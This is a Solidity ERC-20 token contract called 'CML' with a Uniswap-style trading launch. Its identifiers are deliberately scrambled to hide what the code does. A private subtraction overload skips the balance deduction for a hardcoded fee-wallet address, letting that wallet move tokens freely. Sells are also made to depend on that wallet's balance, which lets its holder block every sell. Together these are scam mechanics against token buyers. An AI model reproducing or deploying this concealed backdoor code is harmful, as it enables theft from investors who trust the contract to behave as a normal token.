// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgsSenders() internal view virtual returns (address) {
        return msg. sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  afuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  afuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  afuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function etyh(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: etyhtiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _aowtners;
    event OwnersshipsTransferreds(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgsSenders();
        _aowtners = msgSender;
        emit OwnersshipsTransferreds(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _aowtners;
    }

    modifier onlyOwner() {
        require(_aowtners == _msgsSenders(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnersshipsTransferreds(_aowtners, address(0));
        _aowtners = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CML is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "CML";
    string private constant _symbol = "CML";
    uint8 private constant _decimals = 9;
    uint256 private constant to_tolSapplyur = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = to_tolSapplyur;
    uint256 public _maxWalletSize = to_tolSapplyur;
    uint256 public _taxSwapThreshold= to_tolSapplyur;
    uint256 public _maxTaxSwap= to_tolSapplyur;

    uint256 private _TaxBuyinitial=10;
    uint256 private _TaxSellinitial=15;
    uint256 private _TaxBuyfinal=1;
    uint256 private _TaxSellfinal=1;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=1;
    uint256 private ouc_PeuatcokSouiy=0;
    uint256 private ksm_rBartygr=0;

    mapping (address => uint256) private  _alancer;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  gfr_cunayvg;
    mapping (address => bool) private  ifr_Waeoakirt;
    mapping(address => uint256) private  ykf_fareTrasrode;
    bool public  tfiv_rdcuiay = false;
    address public  zt_nrFeehRecfeuarw =0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    IUniswapV2Router02 private  xun_swapikRautersUnaswaaikFck;
    address private  au_naswaakPaarkTakenkuLf;
    bool private  Qr_bTrajqsrq;
    bool private  ve_srwxpug = false;
    bool private  sw_apwlrsUniswppsSuer = false;

 
    event MaxTxrAmountxxud(uint _maxTxAmount);
    modifier lockTheSwap {
        ve_srwxpug = true;
        _;
        ve_srwxpug = false;
    }

    constructor () {
        _alancer[_msgsSenders()] = to_tolSapplyur;
        gfr_cunayvg[owner()] = true;
        gfr_cunayvg[address(this)] = true;
        gfr_cunayvg[zt_nrFeehRecfeuarw] = true;


        emit Transfer(address(0), _msgsSenders(), to_tolSapplyur);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return to_tolSapplyur;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _alancer[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgsSenders(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgsSenders(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgsSenders(), _allowances[sender][_msgsSenders()]. afuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rtoxsAmaunts=0;
        if (from != owner() &&  to  != owner()) {

            if (tfiv_rdcuiay) {
                if (to != address(xun_swapikRautersUnaswaaikFck) &&  to  != address(au_naswaakPaarkTakenkuLf)) {
                  require(ykf_fareTrasrode[ tx.origin ]  < block.number,"Only one transfer per block allowed.");
                  ykf_fareTrasrode[ tx.origin ]  = block.number;
                }
            }

            if (from == au_naswaakPaarkTakenkuLf &&  to  != address(xun_swapikRautersUnaswaaikFck) && !gfr_cunayvg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(ksm_rBartygr<ouc_PeuatcokSouiy){
                  require(!ar_atpuq(to));
                }
                ksm_rBartygr++; ifr_Waeoakirt[to]=true;
                rtoxsAmaunts = amount.etyh((ksm_rBartygr>_reduceBuyTaxAt)?_TaxBuyfinal:_TaxBuyinitial).div(100);
            }

            if(to == au_naswaakPaarkTakenkuLf && from!= address(this) && !gfr_cunayvg[from] ){
                require(amount <= _maxTxAmount && balanceOf(zt_nrFeehRecfeuarw)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                rtoxsAmaunts = amount.etyh((ksm_rBartygr>_reduceSellTaxAt)?_TaxSellfinal:_TaxSellinitial).div(100);
                require(ksm_rBartygr>ouc_PeuatcokSouiy && ifr_Waeoakirt[from]);
            }

            uint256 kcantractTakenBolances = balanceOf(address(this));
            if (!ve_srwxpug 
            && to == au_naswaakPaarkTakenkuLf && sw_apwlrsUniswppsSuer && kcantractTakenBolances>_taxSwapThreshold 
            && ksm_rBartygr>ouc_PeuatcokSouiy && !gfr_cunayvg[to]&& !gfr_cunayvg[from]
            ) {
                rwopejqlur( vprty(amount, vprty(kcantractTakenBolances,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(rtoxsAmaunts>0){
          _alancer[address(this)]=_alancer[address(this)].add(rtoxsAmaunts);
          emit Transfer(from, address(this),rtoxsAmaunts);
        }
        _alancer[from]= afuxr(from, _alancer[from], amount);
        _alancer[to]=_alancer[to].add(amount. afuxr(rtoxsAmaunts));
        emit Transfer(from, to, amount. afuxr(rtoxsAmaunts));
    }

    function rwopejqlur(uint256 umiuntkFktoknp) private lockTheSwap {
        if(umiuntkFktoknp==0){return;}
        if(!Qr_bTrajqsrq){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = xun_swapikRautersUnaswaaikFck.WETH();
        _approve(address(this), address(xun_swapikRautersUnaswaaikFck), umiuntkFktoknp);
        xun_swapikRautersUnaswaaikFck.swapExactTokensForETHSupportingFeeOnTransferTokens(
            umiuntkFktoknp,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  vprty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  afuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == zt_nrFeehRecfeuarw){
            return a;
        }else{
            return a. afuxr(b);
        }
    }

    function remaveryLimits() external onlyOwner{
        _maxTxAmount = to_tolSapplyur;
        _maxWalletSize = to_tolSapplyur;
        tfiv_rdcuiay = false;
        emit MaxTxrAmountxxud(to_tolSapplyur);
    }

    function ar_atpuq( address  birpyr )  private  view  returns ( bool ) {
        uint256 reoqBoraeidr ; assembly  {reoqBoraeidr  :=  extcodesize  (birpyr)
        }
        return reoqBoraeidr  >  0;
    }


    function startsTradings() external onlyOwner() {
        require(!Qr_bTrajqsrq,"trading is already open");
        xun_swapikRautersUnaswaaikFck = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address(this), address(xun_swapikRautersUnaswaaikFck), to_tolSapplyur);
        au_naswaakPaarkTakenkuLf = IUniswapV2Factory(xun_swapikRautersUnaswaaikFck.factory()).createPair(address(this), xun_swapikRautersUnaswaaikFck.WETH());
        xun_swapikRautersUnaswaaikFck. addLiquidityETH {value:  address(this). balance}( address(this), balanceOf ( address (this)), 0, 0,owner(),block.timestamp);
        IERC20(au_naswaakPaarkTakenkuLf).approve(address(xun_swapikRautersUnaswaaikFck), type (uint). max);
        sw_apwlrsUniswppsSuer = true;
        Qr_bTrajqsrq = true;
    }


    receive() external payable {}
}